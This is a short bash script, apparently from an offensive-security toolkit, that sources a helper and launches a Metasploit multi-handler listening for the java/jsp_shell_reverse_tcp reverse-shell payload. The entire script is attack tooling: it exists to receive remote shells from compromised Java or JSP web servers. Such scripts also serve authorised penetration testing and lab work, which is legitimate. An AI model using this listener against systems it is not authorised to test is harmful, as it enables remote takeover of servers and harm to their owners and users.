#!/bin/bash

: '
meterpreter: start meterpreter listener java/jsp_shell_reverse_tcp
'

source ${SCRIPTS_DIR}/shell/msfconsole/.files/listen_to_meterpreter_rev_shell.sh

PAYLOAD="java/jsp_shell_reverse_tcp"

create_meterpreter_multi_handler "${PAYLOAD}"
